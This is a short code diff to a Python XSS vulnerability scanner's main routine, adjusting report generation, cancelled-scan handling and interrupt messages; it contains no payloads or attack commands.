             console.print("\n[bold cyan]Generating reports...[/bold cyan]")
             reporter = ReportGenerator()
             reporter.save_report(vulnerabilities, url, format='both')
-            
-        else:
+
+        elif not scanner.cancelled:
             console.print("[bold green]No XSS vulnerabilities found![/bold green]")
-            
-    except KeyboardInterrupt:
-        console.print("\n[yellow]Scan interrupted by user[/yellow]")
+
+    except (KeyboardInterrupt, asyncio.CancelledError):
+        console.print("\n[yellow]Scan interrupted by user.[/yellow]")
     except Exception as e:
         console.print(f"\n[red]Unexpected error during scan: {e}[/red]")
         logger.exception("Scan failed with exception")
